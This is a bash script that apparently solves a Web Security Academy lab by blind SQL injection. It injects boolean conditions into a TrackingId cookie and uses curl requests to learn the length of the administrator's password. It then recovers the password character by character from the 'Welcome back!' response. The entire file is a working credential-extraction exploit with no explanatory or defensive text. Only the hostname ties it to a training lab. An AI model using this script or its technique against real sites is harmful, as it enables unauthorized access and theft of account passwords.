#!/bin/bash


#stuff="1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
stuff="1234567890abcdefghijklmnopqrstuvwxyz"
password_length=0
counter=0

while $true; do
    if curl -s -k "https://0ae00055039cb80bc0867db400fd000f.web-security-academy.net/" --cookie "TrackingId=Hih4kt8efYGw5Frj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>$counter)='a; session=lDSgXGgtnsKNITLEO88M8c9R7xUpGwDo"  | grep "Welcome back!" > /dev/null;then 
        let password_length++
        let counter++
    else
        break
    fi
done


for i in $( seq 0 $password_length )
do
    while read -n1 character; do
        if curl -s -k "https://0ae00055039cb80bc0867db400fd000f.web-security-academy.net/" --cookie "TrackingId=Hih4kt8efYGw5Frj' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),$i,1) = '$character; session=lDSgXGgtnsKNITLEO88M8c9R7xUpGwDo"  | grep "Welcome back!" > /dev/null; then
             echo -n $character
         fi
    done < <(echo -n "$stuff")
done

